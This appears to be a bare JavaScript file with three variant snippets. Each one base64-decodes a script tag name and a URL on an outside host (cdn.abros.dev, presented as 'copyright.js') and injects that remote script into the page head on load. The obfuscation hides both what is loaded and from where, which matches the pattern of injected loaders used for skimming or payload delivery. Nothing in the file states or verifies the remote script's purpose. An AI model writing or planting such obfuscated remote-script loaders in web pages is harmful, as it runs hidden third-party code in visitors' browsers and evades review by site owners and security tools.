(function () {
  function loadSCA() {
    const a = "aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw==";
    const b = "c2NyaXB0";
    const r = document.createElement(atob(b));
    r.src = atob(a);
    r.async = true;
    document.head.appendChild(r);
  }
  loadSCA();
})();

(function () {
  document.head.appendChild(
    Object.assign(document.createElement(atob("c2NyaXB0")), {
      src: atob("aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw=="),
      async: true,
    })
  );
})();

(function (d, s) {
  d.head.appendChild((s = d.createElement(atob("c2NyaXB0")))).src = atob(
    "aHR0cHM6Ly9jZG4uYWJyb3MuZGV2L2NvcHlyaWdodC5qcw=="
  );
  s.async = !0;
})(document);
